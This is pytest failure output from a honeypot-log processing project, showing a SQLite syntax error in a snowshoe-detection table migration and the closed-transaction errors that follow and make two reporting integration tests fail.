2025-10-18 17:41:31,064:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:31,064:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:31,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:31,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:31,068:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:31,068:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:31,070:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:31,070:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:31,071:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:31,071:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:31,073:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:31,073:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:31,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:31,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:31,077:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:31,077:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:31,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:31,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:31,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:31,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:31,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:31,080:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:31,083:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:31,083:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:31,084:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,084:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,084:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,084:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,085:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,086:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:31,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______ TestReportingQueries.test_reporting_queries_without_sensor_filter _______

self = <test_reporting_queries.TestReportingQueries object at 0x7756b4573bb0>

    def test_reporting_queries_without_sensor_filter(self) -> None:
        """Test reporting queries without sensor filter."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create database and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:310: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa4c90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:31,598:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:31,598:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:31,599:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:31,599:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:31,606:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:31,606:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:31,608:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:31,608:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:31,609:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:31,609:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:31,611:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:31,611:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:31,613:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:31,613:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:31,615:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:31,615:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:31,616:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:31,616:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:31,617:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:31,617:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:31,619:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:31,619:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:31,621:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:31,621:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:31,622:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:31,622:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:31,623:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:31,623:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:31,624:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,624:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,625:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,625:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,625:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,625:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,628:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,628:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,629:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,629:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:31,629:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:31,629:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________ TestReportingIntegration.test_full_reporting_workflow _____________

self = <test_reporting_queries.TestReportingIntegration object at 0x7756b43d1e50>

    def test_full_reporting_workflow(self) -> None:
        """Test complete reporting workflow with JSON abstraction."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create database and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:387: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2783690>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:32,100:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:32,100:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:32,101:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:32,101:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:32,108:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:32,108:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:32,109:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:32,109:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:32,111:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:32,111:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
